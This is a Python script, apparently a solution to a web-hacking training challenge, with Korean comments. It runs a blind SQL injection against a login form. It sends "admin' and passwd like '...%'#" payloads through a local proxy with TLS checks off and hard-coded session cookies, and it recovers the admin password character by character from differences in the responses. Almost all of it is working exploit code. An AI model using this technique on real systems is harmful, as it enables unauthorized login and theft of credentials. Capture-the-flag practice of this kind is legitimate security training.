import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def login(id, pw):
    url = "https://training.zairo.kr/challenge/c4f0f5b951b88d458cc15725500ad71a/index.html"

    headers = {
        "Cookie": "challenge14_session=e1f64f2be8f0520f540f4dbf68e1e349; session=.eJyrVkpMyc3MU7JKS8wpTtVRyslPT09NiQeJlBSVAgVKi1OL4jNTlKyUUjJyMtNSDQwslaCieYm5qUDxmNKkZENTIGmcbBJTmmJmYKJUCwAe3hzw.YUVQkw.z9h015zFfut2VKDO8E7Hq4nrIRw;"
    }

    proxy = {
        'http': 'http://127.0.0.1:8888',
        'https': 'http://127.0.0.1:8888'
    }

    data = {
        'id': id,
        'passwd': pw,
    }

    r = requests.post(url, headers=headers, data=data, proxies=proxy, verify=False)
    return r.text

string_list = "abcdefghijklmnopqrstuvwxyz0123456789!@_"
password = ""

for i in range(20): #패스워드가 20글자니깐 20번 반복
    for ch in string_list:  #문자 경우의 수 다 시도하기
        data = login("admin' and passwd like '{}{}%'#".format(password, ch), "a")
        if "admin" in data: #admin이 들어가 있으면 맞음. 맞았을 때(틀렸을 땐 empty로 표시됨 - 사이트 보안허점)
            password += ch
            print("[*] password is [{}]".format(password))
            break